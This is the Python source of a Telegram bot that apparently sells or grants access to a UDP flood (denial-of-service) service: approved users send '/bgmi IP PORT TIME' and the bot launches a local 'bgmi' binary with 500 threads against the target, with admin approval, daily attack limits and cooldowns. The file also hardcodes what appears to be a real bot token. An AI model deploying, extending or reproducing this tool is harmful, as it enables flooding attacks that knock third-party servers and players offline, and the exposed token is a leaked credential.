import os
import telebot
import logging
import subprocess
import threading
import time
import json
from datetime import datetime, timedelta

# Setup
logging.basicConfig(level=logging.INFO)
TOKEN = '8699345560:AAEId4DfullLQZbW9hRFVIjLkI4xCG1fNXc'
ADMIN_IDS = [1917682089]  # Your admin ID

bot = telebot.TeleBot(TOKEN)

# Global variables
user_attacks = {}
user_cooldowns = {}
active_attacks = 0

# ============================================
# APPROVAL SYSTEM - NEW FEATURE ✅
# ============================================
APPROVED_USERS_FILE = "approved_users.json"

# Load approved users from file
def load_approved_users():
    try:
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        return set()

# Save approved users to file
def save_approved_users():
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(APPROVED_USERS), f)

APPROVED_USERS = load_approved_users()

# Check if user is approved
def is_approved(user_id):
    return user_id in ADMIN_IDS or user_id in APPROVED_USERS

# Add user to approval list
def approve_user(user_id):
    APPROVED_USERS.add(user_id)
    save_approved_users()

# Remove user from approval list
def remove_user(user_id):
    APPROVED_USERS.discard(user_id)
    save_approved_users()

# ============================================
# CONFIGURATION
# ============================================
THREAD_COUNT = 500
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Escape Markdown special characters
def escape_markdown(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in escape_chars else char for char in str(text))

# Safe send message function
def safe_send_message(chat_id, text, parse_mode="Markdown"):
    try:
        # Escape the text properly
        if parse_mode == "Markdown":
            # Don't escape code blocks
            parts = text.split('`')
            for i in range(0, len(parts), 2):
                parts[i] = escape_markdown(parts[i])
            text = '`'.join(parts)
        
        bot.send_message(chat_id, text, parse_mode=parse_mode)
    except Exception as e:
        # If Markdown fails, send without formatting
        bot.send_message(chat_id, text.replace('_', '').replace('*', '').replace('`', ''))

# ============================================
# COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_approved(user_id):
        status = "✅ APPROVED"
    else:
        status = "⏳ PENDING APPROVAL"
    
    safe_send_message(
        message.chat.id,
        f"🚀 *Welcome @{username}!*\n\n"
        f"📊 *Your Status:* {status}\n\n"
        f"📌 *Commands:*\n"
        f"/bgmi IP PORT TIME - Start attack (Approved users only)\n"
        f"/status - Check your limits\n"
        f"/approve_list - List approved users (Admin only)\n"
        f"/approve <user_id> - Approve a user (Admin only)\n"
        f"/remove <user_id> - Remove user approval (Admin only)\n"
        f"/reset_TF - Reset all limits (Admin only)",
        "Markdown"
    )

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if not is_approved(user_id):
        safe_send_message(
            message.chat.id,
            f"❌ *Access Denied @{username}!*\n\nYou are not approved to use this bot.\nContact admin for approval.",
            "Markdown"
        )
        return
    
    remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    
    cooldown_remaining = 0
    if user_id in user_cooldowns:
        cooldown_end = user_cooldowns[user_id]
        if datetime.now() < cooldown_end:
            cooldown_remaining = int((cooldown_end - datetime.now()).seconds)
    
    status_msg = (
        f"🛡️ *Attack Status*\n"
        f"👤 User: @{username}\n"
        f"✅ Approved: Yes\n"
        f"🎯 Remaining Today: {remaining}/{DAILY_ATTACK_LIMIT}\n"
        f"⏳ Cooldown: {cooldown_remaining}s\n"
        f"🧵 Threads per attack: {THREAD_COUNT}\n"
        f"⚡ Active Attacks: {active_attacks}/{MAX_ACTIVE_ATTACKS}"
    )
    safe_send_message(message.chat.id, status_msg, "Markdown")

@bot.message_handler(commands=['approve_list'])
def approve_list(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
        return
    
    if not APPROVED_USERS:
        safe_send_message(message.chat.id, "📋 *Approved Users List*\n\nNo approved users yet.", "Markdown")
        return
    
    user_list = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
    safe_send_message(
        message.chat.id,
        f"📋 *Approved Users List*\n\n{user_list}\n\nTotal: {len(APPROVED_USERS)} users",
        "Markdown"
    )

@bot.message_handler(commands=['approve'])
def approve_user_command(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            safe_send_message(message.chat.id, "❌ *Usage:* `/approve <user_id>`", "Markdown")
            return
        
        target_id = int(args[1])
        approve_user(target_id)
        
        safe_send_message(
            message.chat.id,
            f"✅ *User Approved!*\n\nUser ID: `{target_id}`\nNow they can use /bgmi command.",
            "Markdown"
        )
    except ValueError:
        safe_send_message(message.chat.id, "❌ *Invalid User ID!*", "Markdown")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            safe_send_message(message.chat.id, "❌ *Usage:* `/remove <user_id>`", "Markdown")
            return
        
        target_id = int(args[1])
        
        if target_id in ADMIN_IDS:
            safe_send_message(message.chat.id, "❌ *Cannot remove admin!*", "Markdown")
            return
        
        remove_user(target_id)
        
        safe_send_message(
            message.chat.id,
            f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.",
            "Markdown"
        )
    except ValueError:
        safe_send_message(message.chat.id, "❌ *Invalid User ID!*", "Markdown")

@bot.message_handler(commands=['reset_TF'])
def reset_attack_limit(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*", "Markdown")
        return
    
    user_attacks.clear()
    user_cooldowns.clear()
    safe_send_message(message.chat.id, "🔄 *All attack limits have been reset by ADMIN!*", "Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attacks
    
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # ============================================
    # APPROVAL CHECK - MAIN GATE ✅
    # ============================================
    if not is_approved(user_id):
        safe_send_message(
            message.chat.id,
            f"❌ *Access Denied @{username}!*\n\n"
            f"You are not approved to use this bot.\n\n"
            f"📌 Contact admin: /owner",
            "Markdown"
        )
        return
    
    # Check if user is in cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        safe_send_message(
            message.chat.id,
            f"⏰ *Cooldown* @{username}\nPlease wait {remaining} seconds.",
            "Markdown"
        )
        return
    
    # Check daily limit
    if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
        safe_send_message(
            message.chat.id,
            f"❌ *Daily limit reached* @{username}\nLimit: {DAILY_ATTACK_LIMIT} attacks/day",
            "Markdown"
        )
        return
    
    # Check active attacks limit
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        safe_send_message(
            message.chat.id,
            f"⏳ *Please wait* @{username}\n{MAX_ACTIVE_ATTACKS} attacks already running.",
            "Markdown"
        )
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            safe_send_message(
                message.chat.id,
                f"❌ *Usage:* /bgmi IP PORT TIME\n"
                f"📌 *Example:* /bgmi 1.1.1.1 80 60\n\n"
                f"💡 *Note:* Threads are fixed at {THREAD_COUNT}",
                "Markdown"
            )
            return
        
        ip, port, time_val = args
        
        # Validation
        if not is_valid_ip(ip):
            safe_send_message(message.chat.id, f"❌ *Invalid IP address* @{username}", "Markdown")
            return
        
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            safe_send_message(message.chat.id, f"❌ *Invalid port* @{username} (1-65535)", "Markdown")
            return
        
        if not time_val.isdigit() or int(time_val) < 1 or int(time_val) > 300:
            safe_send_message(message.chat.id, f"❌ *Invalid time* @{username} (1-300 seconds)", "Markdown")
            return
        
        # Update user stats
        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        active_attacks += 1
        
        remaining = DAILY_ATTACK_LIMIT - user_attacks[user_id]
        
        # Confirm attack start
        safe_send_message(
            message.chat.id,
            f"🚀 *Attack Started!*\n"
            f"👤 User: @{username} ✅\n"
            f"🎯 Target: {ip}:{port}\n"
            f"⏰ Duration: {time_val}s\n"
            f"🧵 Threads: {THREAD_COUNT}\n"
            f"🎯 Remaining Today: {remaining}/{DAILY_ATTACK_LIMIT}",
            "Markdown"
        )
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=execute_attack,
            args=(ip, int(port), int(time_val), username, user_id)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        active_attacks = max(0, active_attacks - 1)
        safe_send_message(message.chat.id, f"❌ *Error:* {str(e)}", "Markdown")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    safe_send_message(
        message.chat.id,
        f"👑 *Bot Owner*\n\n"
        f"For approval or support, contact:\n"
        f"Admin ID: `{ADMIN_IDS[0]}`\n\n"
        f"Send your User ID to get approved.",
        "Markdown"
    )

def execute_attack(ip, port, duration, username, user_id):
    global active_attacks
    
    try:
        # Check if bgmi binary exists and is executable
        if not os.path.exists('./bgmi'):
            safe_send_message(ADMIN_IDS[0], "❌ *Error:* bgmi binary not found!", "Markdown")
            return
        
        cmd = f"./bgmi {ip} {port} {duration} {THREAD_COUNT}"
        logging.info(f"Executing: {cmd}")
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            executable='/bin/bash'
        )
        
        stdout, stderr = process.communicate(timeout=duration + 10)
        
        if process.returncode == 0:
            safe_send_message(
                ADMIN_IDS[0],
                f"✅ *Attack Completed*\n"
                f"🎯 Target: {ip}:{port}\n"
                f"👤 By: @{username}\n"
                f"⏰ Duration: {duration}s\n"
                f"🧵 Threads: {THREAD_COUNT}",
                "Markdown"
            )
        else:
            safe_send_message(
                ADMIN_IDS[0],
                f"⚠️ *Attack Issue*\n🎯 Target: {ip}:{port}\n👤 By: @{username}\nError: {stderr.decode()}",
                "Markdown"
            )
        
    except subprocess.TimeoutExpired:
        process.kill()
        safe_send_message(
            ADMIN_IDS[0],
            f"⚠️ *Attack Timeout*\n🎯 Target: {ip}:{port}\n👤 By: @{username}",
            "Markdown"
        )
    except Exception as e:
        safe_send_message(
            ADMIN_IDS[0],
            f"❌ *Attack Failed*\n👤 User: @{username}\nError: {str(e)}",
            "Markdown"
        )
    finally:
        active_attacks = max(0, active_attacks - 1)

if __name__ == "__main__":
    print("🤖 UDP Flood Bot Starting...")
    print(f"📊 Config: {THREAD_COUNT} threads | {MAX_ACTIVE_ATTACKS} max attacks")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"✅ Approved Users: {len(APPROVED_USERS)}")
    print("✅ Bot is running...")
    
    # Retry logic for polling
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(15)
